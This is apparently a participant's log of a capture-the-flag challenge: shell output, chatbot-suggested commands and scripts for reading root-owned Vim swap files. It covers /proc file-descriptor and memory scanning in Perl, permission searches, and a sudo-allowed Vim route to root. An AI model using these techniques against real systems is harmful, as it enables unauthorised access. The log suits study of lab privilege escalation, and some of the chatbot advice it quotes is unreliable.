#Read the flag from the correct descriptor (likely 3)
cat /proc/$PPID/fd/3
$ $ $ $ ls: cannot access '3853/fd': No such file or directory
/proc/:
total 0
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 16
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1679
dr-xr-xr-x  9 ctf  ctf     0 May 22 10:33 1684
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 17
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1842
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 1843
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2098
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2099
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2158
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2159
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2161
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2163
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 232
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2320
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2321
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 233
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2453
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2454
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2510
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2511
dr-xr-xr-x  9 root root    0 May 23 04:58 2521
dr-xr-xr-x  9 root root    0 May 23 04:58 2522
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2529
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2530
dr-xr-xr-x  9 root root    0 May 23 04:58 2534
dr-xr-xr-x  9 root root    0 May 23 04:58 2535
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2549
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 255
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2550
dr-xr-xr-x  9 ctf  ctf     0 May 22 06:48 256
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2647
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2648
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2655
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2656
dr-xr-xr-x  9 root root    0 May 23 04:58 2674
dr-xr-xr-x  9 root root    0 May 23 04:58 2675
dr-xr-xr-x  9 root root    0 May 23 04:58 2676
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2726
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2727
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2732
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2850
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2851
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2901
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2902
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 2907
dr-xr-xr-x  9 ctf  ctf     0 May 22 11:48 2915
dr-xr-xr-x  9 ctf  ctf     0 May 22 11:49 2916
dr-xr-xr-x  9 root root    0 May 22 11:50 2927
dr-xr-xr-x  9 root root    0 May 22 11:50 2928
dr-xr-xr-x  9 root root    0 May 22 11:50 2929
dr-xr-xr-x  9 root root    0 May 22 11:50 2930
dr-xr-xr-x  9 root root    0 May 22 11:51 2932
dr-xr-xr-x  9 ctf  ctf     0 May 22 13:30 3146
dr-xr-xr-x  9 ctf  ctf     0 May 22 13:30 3147
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 317
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 318
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3263
dr-xr-xr-x  9 ctf  ctf     0 May 22 14:39 3264
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 331
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 332
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3389
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3390
dr-xr-xr-x  9 root root    0 May 22 17:14 3392
dr-xr-xr-x  9 root root    0 May 23 04:58 3393
dr-xr-xr-x  9 root root    0 May 23 04:58 3394
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3405
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3406
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3411
dr-xr-xr-x  9 ctf  ctf     0 May 22 19:45 3412
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 3415
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 3416
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3464
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3465
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:06 3468
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3484
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:17 3485
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:30 3495
dr-xr-xr-x  9 ctf  ctf     0 May 23 05:30 3496
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 350
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3619
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3620
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3625
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3626
dr-xr-xr-x  9 root root    0 May 23 09:44 3634
dr-xr-xr-x  9 root root    0 May 23 09:44 3635
dr-xr-xr-x  9 root root    0 May 23 09:44 3636
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3659
dr-xr-xr-x  9 ctf  ctf     0 May 23 09:48 3660
dr-xr-xr-x  9 root root    0 May 23 09:48 3662
dr-xr-xr-x  9 root root    0 May 23 09:48 3663
dr-xr-xr-x  9 root root    0 May 23 09:48 3664
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:30 3759
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:30 3760
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:44 3775
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:44 3776
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:44 3777
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:44 3778
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:45 3808
dr-xr-xr-x  9 ctf  ctf     0 May 23 10:45 3809
dr-xr-xr-x  9 ctf  ctf     0 May 23 12:00 3853
dr-xr-xr-x  9 ctf  ctf     0 May 23 12:00 3854
dr-xr-xr-x  9 ctf  ctf     0 May 23 12:00 3867
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 518
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 519
dr-xr-xr-x  9 ctf  ctf     0 May 22 10:33 528
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:55 556
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 557
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 717
dr-xr-xr-x  9 ctf  ctf     0 May 23 04:58 718
drwxrwxrwt  2 root root   40 May 15 11:41 acpi
-r--r--r--  1 root root    0 May 23 05:30 bootconfig
-r--r--r--  1 root root    0 May 23 05:30 buddyinfo
dr-xr-xr-x  4 root root    0 May 15 11:41 bus
-r--r--r--  1 root root    0 May 23 05:30 cgroups
-r--r--r--  1 root root  157 May 23 05:30 cmdline
-r--r--r--  1 root root    0 May 23 05:30 consoles
-r--r--r--  1 root root    0 May 23 05:30 cpuinfo
-r--r--r--  1 root root    0 May 23 05:30 crypto
-r--r--r--  1 root root    0 May 23 05:30 devices
-r--r--r--  1 root root    0 May 23 05:30 diskstats
-r--r--r--  1 root root    0 May 23 05:30 dma
dr-xr-xr-x  3 root root    0 May 23 05:30 driver
dr-xr-xr-x  3 root root    0 May 23 05:30 dynamic_debug
-r--r--r--  1 root root    0 May 23 05:30 execdomains
-r--r--r--  1 root root    0 May 23 05:30 fb
-r--r--r--  1 root root    0 May 23 04:51 filesystems
dr-xr-xr-x  5 root root    0 May 15 11:41 fs
crw-rw-rw-  1 root root 1, 3 May 15 11:41 interrupts
-r--r--r--  1 root root    0 May 23 05:30 iomem
-r--r--r--  1 root root    0 May 23 05:30 ioports
dr-xr-xr-x 28 root root    0 May 15 11:41 irq
-r--r--r--  1 root root    0 May 23 05:30 kallsyms
crw-rw-rw-  1 root root 1, 3 May 15 11:41 kcore
-r--r--r--  1 root root    0 May 23 05:30 key-users
crw-rw-rw-  1 root root 1, 3 May 15 11:41 keys
-r--------  1 root root    0 May 23 05:30 kmsg
-r--------  1 root root    0 May 23 05:30 kpagecgroup
-r--------  1 root root    0 May 23 05:30 kpagecount
-r--------  1 root root    0 May 23 05:30 kpageflags
crw-rw-rw-  1 root root 1, 3 May 15 11:41 latency_stats
-r--r--r--  1 root root    0 May 23 05:30 loadavg
-r--r--r--  1 root root    0 May 23 05:30 locks
-r--r--r--  1 root root    0 May 23 05:30 mdstat
-r--r--r--  1 root root    0 May 23 05:30 meminfo
-r--r--r--  1 root root    0 May 23 05:30 misc
-r--r--r--  1 root root    0 May 23 05:30 modules
lrwxrwxrwx  1 root root   11 May 23 05:30 mounts -> self/mounts
-rw-r--r--  1 root root    0 May 23 05:30 mtrr
lrwxrwxrwx  1 root root    8 May 23 05:30 net -> self/net
-r--------  1 root root    0 May 23 05:30 pagetypeinfo
-r--r--r--  1 root root    0 May 23 05:30 partitions
dr-xr-xr-x  5 root root    0 May 23 05:30 pressure
-r--r--r--  1 root root    0 May 23 05:30 schedstat
drwxrwxrwt  2 root root   40 May 15 11:41 scsi
lrwxrwxrwx  1 root root    0 May 15 11:41 self -> 3867
-r--------  1 root root    0 May 23 05:30 slabinfo
-r--r--r--  1 root root    0 May 23 05:30 softirqs
-r--r--r--  1 root root    0 May 23 05:30 stat
-r--r--r--  1 root root    0 May 23 05:30 swaps
dr-xr-xr-x  1 root root    0 May 15 11:41 sys
--w-------  1 root root    0 May 15 11:41 sysrq-trigger
dr-xr-xr-x  5 root root    0 May 23 05:30 sysvipc
lrwxrwxrwx  1 root root    0 May 15 11:41 thread-self -> 3867/task/3867
crw-rw-rw-  1 root root 1, 3 May 15 11:41 timer_list
dr-xr-xr-x  6 root root    0 May 23 05:30 tty
-r--r--r--  1 root root    0 May 23 04:58 uptime
-r--r--r--  1 root root    0 May 23 05:30 version
-r--r--r--  1 root root    0 May 23 05:30 version_signature
-r--------  1 root root    0 May 23 05:30 vmallocinfo
-r--r--r--  1 root root    0 May 23 05:30 vmstat
dr-xr-xr-x  2 root root    0 May 23 05:30 xen
-r--r--r--  1 root root    0 May 23 05:30 zoneinfo
$ $ $ cat: /proc/: Is a directory
cat: 3853/fd/3: No such file or directory


Now I told Perplexity what all I have tried with no progress. Here is what is happening according to it:
You are in /chal with .swp and .swo files, both owned by root and not readable by your user.
All attempts to use file descriptors, parent process descriptors, and direct Vim recovery have failed due to permission errors or lack of access.
You do not have any binaries or scripts in /chal to escalate privileges or open the swap file as root.
The swap file is not accessible via base64, xxd, or strings due to permissions.
You cannot transfer the file out with nc or /dev/tcp.
You are blocked by Linux file permissions.
It told me to retry the vim command ( vim -r .swp) once more but I know it will still give Permission denied.
Now it also gave me this command:

find / -type f -perm -o=r 2>/dev/null | grep -i flag

Running this, I got:


$ find / -type f -perm -o=r 2>/dev/null | grep -i flag
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/sys/devices/pnp0/00:06/00:06:0/00:06:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/hypervisor/start_flags/unknown28
/sys/hypervisor/start_flags/unknown18
/sys/hypervisor/start_flags/unknown08
/sys/hypervisor/start_flags/unknown26
/sys/hypervisor/start_flags/unknown16
/sys/hypervisor/start_flags/unknown06
/sys/hypervisor/start_flags/unknown24
/sys/hypervisor/start_flags/unknown14
/sys/hypervisor/start_flags/privileged
/sys/hypervisor/start_flags/unknown04
/sys/hypervisor/start_flags/unknown22
/sys/hypervisor/start_flags/unknown12
/sys/hypervisor/start_flags/unknown02
/sys/hypervisor/start_flags/unknown30
/sys/hypervisor/start_flags/unknown20
/sys/hypervisor/start_flags/unknown10
/sys/hypervisor/start_flags/unknown29
/sys/hypervisor/start_flags/unknown19
/sys/hypervisor/start_flags/unknown09
/sys/hypervisor/start_flags/initdomain
/sys/hypervisor/start_flags/unknown27
/sys/hypervisor/start_flags/unknown17
/sys/hypervisor/start_flags/unknown07
/sys/hypervisor/start_flags/unknown25
/sys/hypervisor/start_flags/unknown15
/sys/hypervisor/start_flags/unknown05
/sys/hypervisor/start_flags/unknown23
/sys/hypervisor/start_flags/unknown13
/sys/hypervisor/start_flags/unknown03
/sys/hypervisor/start_flags/unknown31
/sys/hypervisor/start_flags/unknown21
/sys/hypervisor/start_flags/unknown11
/sys/module/scsi_mod/parameters/default_dev_flags
/tmp/recovered_flag.txt
/tmp/flag.swp


I then tried opening /tmp/recovered_flag.txt but just got 2 q’s separated by a few lines. Prompting this, Perplexity told me that maybe the recovered file is corrupted and told me to delete it and remake it using vim

#Delete the corrupted file
rm /tmp/recovered_flag.txt

#Recover the .swp file again (if possible)
vim -r .swp
#Press 'R' to recover, then save with :wq /tmp/recovered_flag.txt

However, I still got the same file so I think I’m not on the right path.


So the following don’t work(Perplexity):
1. Direct File Access
Tried to cat, base64, xxd, and strings the .swp and .swo files.
2. Vim Recovery
Attempted to recover the original file using:
vim -r .swp
vim -r .swo 
3. File Descriptor Tricks
Checked for open file descriptors in the current and parent processes:
ls -l /proc/self/fd
PPID=$(ps -o ppid= -p $$)
ls -l /proc/$PPID/fd
Tried reading from all possible file descriptors:
for fd in {3..20}; do cat /proc/self/fd/$fd 2>/dev/null; done
4. Grep and Hex Search
Attempted to extract the flag using:
grep -a 'PClub{' .swp
grep -a 'PClub{' .swo
xxd -p .swp | grep '50436c75627b'
xxd -p .swo | grep '50436c75627b'

5. World-Readable File Search
Searched for world-readable files containing the word "flag":
find / -type f -perm -o=r 2>/dev/null | grep -i flag
Result: No relevant flag files found except /tmp/recovered_flag.txt, which contained only q characters (likely from accidental Vim input).

6. Environment Variables and Memory
Checked environment variables and attempted to grep process memory for the flag:
printenv | grep 'PClub{'
grep -a 'PClub{' /proc/self/mem
7. File Transfer Attempts
Tried to use nc (netcat) and /dev/tcp to transfer the swap files to a local machine for offline analysis.
Result: nc was not available on the remote shell, and /dev/tcp was not supported by the shell.



I noticed that the PPID keeps on changing each time I run its code. Hence I prompted this and got this response:
PPID=$(ps -o ppid= -p $$)
for fd in {3..20}; do
  echo "Checking parent fd $fd:"
  cat /proc/$PPID/fd/$fd 2>/dev/null | grep -a 'PClub{' && break
done


But of no avail.

However, no perplexity gave me a python script to run and find the flag in a hidden file descriptor.

import os
import re

#Search all readable memory regions for the flag pattern
flag = None
with open('/proc/self/maps', 'r') as maps:
    for line in maps:
        if 'r' in line.split()[1]:  # Check for readable regions
            start, end = [int(x, 16) for x in line.split()[0].split('-')]
            with open('/proc/self/mem', 'rb', 0) as mem:
                mem.seek(start)
                chunk = mem.read(end - start)
                match = re.search(b'PClub{[\w_]+}', chunk)
                if match:
                    flag = match.group(0).decode()
                    break

print(f"Flag found: {flag}")


However, since python is not installed and I’m unable to install it in the environment since sudo requires a password, it gave me an alternative to run it on Perl if installed.

$ perl --version
This is perl 5, version 38, subversion 2 (v5.38.2) built for x86_64-linux-gnu-thread-multi
(with 45 registered patches, see perl -V for more detail)

 Perl is installed so I ran the given code:

perl -e 'open(MAPS,"<","/proc/self/maps")or die$!;my@r;while(<MAPS>){/^([0-9a-f]+)-([0-9a-f]+)\s+r/&&push@r,[hex$1,hex$2]}close MAPS;open(MEM,"<","/proc/self/mem")or die$!;for(@r){($s,$e)=@$_;seek(MEM,$s,0);read(MEM,$d,$e-$s);$d=~/(PClub\{[^\}]+\})/&&print"$1\n"and last}close MEM;'

On running it, I found the following output:

PClub{��:���U�c��� 
                    ( * / 0 _ ` 0W��UQ���U1����U����RegexpA(���U)r2DESTROYa Q�Q��U���x(��UQ��|��UA��|��U< Q��U!��^!A����UV7�	builtin::aPQ��U8Q��Ux(��UQ��|��U<�T��UA����U؞�builtin1Ȳ��U��M&truea�Q��UhQ��Ux(��UQ��|��UA��|��U<�Q��UA �|��U]
�Q��U�wR��U1(���U7���falsea�Q��U�Q��Ux(��U1����U�=G�ceilA��|��U<�Q��U!A �|��U]
�Q��U�wR��UA����UT"Kkis_boola(R��UR��Ux(��UA��|��U<(R��U!$A �|��U]
@R��U�R��U1ȶ��U]�,�weakenapR��UXR��Ux(��UA��|��U<pR��U!$A �|��U]
�R��U�R��UA����U�i�unweakena�R��U�R��Ux(��UA��|��U<�R��U!$A �|��U]
�R��U�R��UA8���U�YHis_weak��)��U�c���x���U����U����U`���UH���U����U ���U����UaS��U�R��Ux(��UAh���UR�refaddrR��UA��|��U<S��U!$A �|��U]
S��U�R��UAH���U��F�blessedaHS��U0S��Ux(��UA��|��U<HS��U!$A �|��U]
`S��U�R��Ua�S��UxS��Ux(��UA��|��U<�S��U!$A �|��U]
�S��U�R��UA����U���Areftypea�S��U�S��Ux(��Ua
                                            '��U�c���R��UXR��U�R��U�R��U0S��UxS��U�S��T��UA��|��U<�S��U!$A �|��U]
�S��U�R��Ua T��T��Ux(��UA��|��U< T��U!$A �|��U]
8T��U�R��U1(���U^n�floorP���U����U����U����U ���U����U�������U����UH���U����U8���U����UahT��UPT��Ux(��Uq����U�c���R��UXR��U�R��U�R��U0S��UxS��U�S��T��UPT��U�T��UA��|��U<hT��U!$A �|��U]
�T��U�R��UA����UDM�x
is_tainteda�T��U�T��Ux(��UA��|��U<�T��U!$A �|��U]
�T��U�R��U1���U��2trima�T��U�T��Ux(��U!��U��U���U!��U��U����U!@	��UX	��U0���U!�	��U�	��U ����UP{R��U�T��U��a��P���U�tR��U(U��U��a������U�uR��UpU��U��a��P���U �R��U�U��U��a����R��UV��U��a��0�R��U0V��U��a��p�Q��U�V��Uh�c���:G��U�V��Um�a���^��U8W��U�b�� ���U����U����UX���U����U(���U����U����U`���U����U0���U����U���Uh���U����U8���U�������Up���U����U@���U����U���Ux���U����UH���U����U���U����U!$A �|��U]
U��U�R��UAh���U�  �created_as_stringa@U��U(U��Ux(��UA��|��U<@U��U!$A �|��U]
XU��U�R��UA����U���Bcreated_as_numbera�U��UpU��Ux(��UA��|��U<�U��U!$A �|��U]
�U��U�R��UA����UY���indexeda�U��U�U��Ux(��U�hQ��U�Q��UR��UXR��U�R��U�R��U0S��UxS��U�S��T��UPT��U�T��U�T��U(U��UpU��U�U��UV��U0V��UA��|��U<�U��UA �|��U]
�U��U�yR��UA���U����Ut}


Which starts with PClub{ and ends with }. So there is a high chance this contains the flag somewhere.

Prompting GPT, it gave me the following code to run now:

perl -e '
    open(MAPS,"<","/proc/self/maps") or die $!;
    my @r;
    while(<MAPS>) {
        /^([0-9a-f]+)-([0-9a-f]+)\s+r/ && push @r, [hex $1, hex $2];
    }
    close MAPS;

    open(MEM,"<","/proc/self/mem") or die $!;
    binmode MEM;
    for (@r) {
        ($s,$e) = @$_;
        seek(MEM,$s,0);
        read(MEM,$d,$e-$s);
        if ($d =~ /(PClub\{[^\}]+\})/) {
            print "$1\n";
            last;
        }
    }
    close MEM;
'

Which gives the following output:


PClub{F�5_1��5�5_G�5_0G�5_0Q1��5_6H�DB1��5_���CORE::�PlP�*�C7�r[���5_h��5��5_P��5_���5_���5_ȼ�5_X��5_aHG�5_0G�5��5_Q���5_1h�5_��XsCOREaxG�5_`G�5��5_QAH�5_�\"j
            CORE::GLOBAL1��5_���K/a�G�5_�G�5��5_aPf��0_*�C7�r[�F�5_XF�5_�F�5_�F�5_G�5_0G�5_�G�5_�G�5_A Z��4_�G�5_���5_�PlP�*�C7�r[�<","/proc/self/maps") or die $!;1    my @r;<    while(<MAPS>) {P        /^([0-9a-f]+)-([0-9a-f]+)\s+r/ && push @r, [hex $1, hex $2];�    }

Again there are a lot of non-readable characters in it.

I ran a few more scripts but didn’t get a good enough readable flag.


Since I got “Permission denied” for so many, now I will try sudo commands.

sudo vim -r .swp

:w /tmp/recovered_flag.txt

:q

This saves the file recovered_flag.txt 
Opening it with
cat /tmp/recovered_flag.txt
Gives sudo bin/vim


So no progress.








I restarted the port and got 5 files now(apart from the parent and current directory).


nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off
$ ls -a
.  ..  .swl  .swm  .swn  .swo  .swp
$ 


$ ls -la  
total 68
drwxr-xr-x 1 root root  4096 May 23 14:39 .
drwxr-xr-x 1 root root  4096 May 15 11:41 ..
-rw------- 1 root root 12288 May 23 14:32 .swl
-rw------- 1 root root 12288 May 23 13:57 .swm
-rw------- 1 root root 12288 May 23 13:56 .swn
-rw------- 1 root root 12288 May 21 22:22 .swo
-rw------- 1 root root 12288 May 21 22:20 .swp
$ 

I again checked using grep to see if the new files also contain the flag, and they do:

nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off
$ ls -a
.  ..  .swl  .swm  .swn  .swo  .swp
$ grep -ar 'PClub{'
grep: .swm: Permission denied
grep: .swo: Permission denied
grep: .swn: Permission denied
grep: .swp: Permission denied
grep: .swl: Permission denied


I tried running sudo vim with all these files:
nc -v 13.235.21.137 4729
Connection to 13.235.21.137 4729 port [tcp/*] succeeded!
/bin/sh: 0: can't access tty; job control turned off
$ rm /tmp/recovered_* 2>/dev/null
for ext in swl swm swn swo swp; do
  TERM=ansi sudo vim -r ".$ext" -c ':w! /tmp/recovered_'"$ext" -c ':q!' 2>/dev/null
done
$ /bin/sh: 2: Syntax error: "done" unexpected
$ for ext in swl swm swn swo swp; do
  TERM=ansi sudo vim -r ".$ext" -c ':w! /tmp/recovered_'"$ext" -c ':q!' 2>/dev/null> 
> done



Using swap file ".swl"
Original file "[No Name]"
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.

"/tmp/recovered_swl" [New] 3L, 15B written



Using swap file ".swm"
Original file "[No Name]"
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.

"/tmp/recovered_swm" [New] 2L, 14B written



Using swap file ".swn"
Original file "[No Name]"
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.

"/tmp/recovered_swn" [New] 5L, 28B written



Using swap file ".swo"
Original file "[No Name]"
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.
Note: process STILL RUNNING: 2535

"/tmp/recovered_swo" [New] 2L, 14B written


Using swap file ".swp"
Original file "[No Name]"
Recovery completed. You should check if everything is OK.
(You might want to write out this file under another name
and run diff with the original file to check for changes)
You may want to delete the .swp file now.
Note: process STILL RUNNING: 2522

"/tmp/recovered_swp" [New] 2L, 14B written
$ grep -a 'PClub{' /tmp/recovered_*
$ grep -a '{bulCP' /tmp/recovered_*


None of them gives a flag.

At this point I have tried most methods which I could find through prompting LLMs and Googling. 


I searched for /bin now to see what all tools I have:


$ cd ..
$ ls -a
.   .dockerenv	boot  dev  home  lib64	mnt  proc  run	 srv  tmp  var
..  bin		chal  etc  lib	 media	opt  root  sbin  sys  usr
$ cd /bin
$ ls -a
 .			   i386		      sensible-editor
 ..			   iconv	      sensible-pager
'['			   id		      sensible-terminal
 addpart		   infocmp	      seq
 apt			   infotocap	      setarch
 apt-cache		   install	      setpriv
 apt-cdrom		   ionice	      setsid
 apt-config		   ipcmk	      setterm
 apt-get		   ipcrm	      sg
 apt-key		   ipcs		      sh
 apt-mark		   ischroot	      sha1sum
 arch			   join		      sha224sum
 awk			   kill		      sha256sum
 b2sum			   last		      sha384sum
 base32			   lastb	      sha512sum
 base64			   lastlog	      shred
 basename		   ld.so	      shuf
 basenc			   ldd		      skill
 bash			   link		      slabtop
 bashbug		   linux32	      sleep
 captoinfo		   linux64	      snice
 cat			   ln		      socat
 chage			   locale	      socat-broker.sh
 chattr			   locale-check       socat-chain.sh
 chcon			   localedef	      socat-mux.sh
 chfn			   logger	      socat1
 chgrp			   login	      sort
 chmod			   logname	      split
 choom			   ls		      stat
 chown			   lsattr	      stdbuf
 chrt			   lsblk	      stty
 chsh			   lscpu	      su
 cksum			   lsipc	      sudo
 clear			   lslocks	      sudoedit
 clear_console		   lslogins	      sudoreplay
 cmp			   lsmem	      sum
 comm			   lsns		      sync
 cp			   man		      tabs
 csplit			   mawk		      tac
 cut			   mcookie	      tail
 cvtsudoers		   md5sum	      tar
 dash			   md5sum.textutils   taskset
 date			   mesg		      tee
 dd			   mkdir	      tempfile
 deb-systemd-helper	   mkfifo	      test
 deb-systemd-invoke	   mknod	      tic
 debconf		   mktemp	      timeout
 debconf-apt-progress	   more		      tload
 debconf-communicate	   mount	      toe
 debconf-copydb		   mountpoint	      top
 debconf-escape		   mv		      touch
 debconf-set-selections    namei	      tput
 debconf-show		   nawk		      tr
 delpart		   newgrp	      true
 df			   nice		      truncate
 diff			   nisdomainname      tset
 diff3			   nl		      tsort
 dir			   nohup	      tty
 dircolors		   nproc	      tzselect
 dirname		   nsenter	      uclampset
 dmesg			   numfmt	      umount
 dnsdomainname		   od		      uname
 domainname		   pager	      uncompress
 dpkg			   partx	      unexpand
 dpkg-deb		   passwd	      uniq
 dpkg-divert		   paste	      unlink
 dpkg-maintscript-helper   pathchk	      unminimize
 dpkg-query		   perl		      unshare
 dpkg-realpath		   perl5.38.2	      update-alternatives
 dpkg-split		   pgrep	      uptime
 dpkg-statoverride	   pidof	      users
 dpkg-trigger		   pidwait	      utmpdump
 du			   pinky	      vdir
 echo			   pkill	      vi
 editor			   pldd		      view
 egrep			   pmap		      vim
 env			   pr		      vim.basic
 ex			   printenv	      vimdiff
 expand			   printf	      vimtutor
 expiry			   prlimit	      vmstat
 expr			   procan	      w
 factor			   ps		      wall
 faillog		   ptx		      watch
 fallocate		   pwd		      wc
 false			   pwdx		      wdctl
 fgrep			   rbash	      whereis
 filan			   readlink	      which
 find			   realpath	      which.debianutils
 findmnt		   rename.ul	      who
 flock			   renice	      whoami
 fmt			   reset	      x86_64
 fold			   resizepart	      xargs
 free			   rev		      xxd
 getconf		   rgrep	      yes
 getent			   rm		      ypdomainname
 getopt			   rmdir	      zcat
 gpasswd		   run-parts	      zcmp
 gpgv			   runcon	      zdiff
 grep			   rview	      zdump
 groups			   rvim		      zegrep
 gunzip			   savelog	      zfgrep
 gzexe			   script	      zforce
 gzip			   scriptlive	      zgrep
 hardlink		   scriptreplay       zless
 head			   sdiff	      zmore
 helpztags		   sed		      znew
 hostid			   select-editor
 hostname		   sensible-browser

Using sudo -l. I am sure I need to use the vim command as it is the only command for which I have full sudo permissions:

$ sudo -l
Matching Defaults entries for ctf on 1d6089cf076a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User ctf may run the following commands on 1d6089cf076a:
    (ALL) NOPASSWD: /bin/vim


I tried sudo vim -r .swp again and again got same text “udo /bin/vim” in the recovered file.

I ran another cim command:

$ sudo vim .swp

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_ansi
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_pcansi
    builtin_win32
    builtin_amiga
    builtin_dumb
    builtin_debug
defaulting to 'ansi'

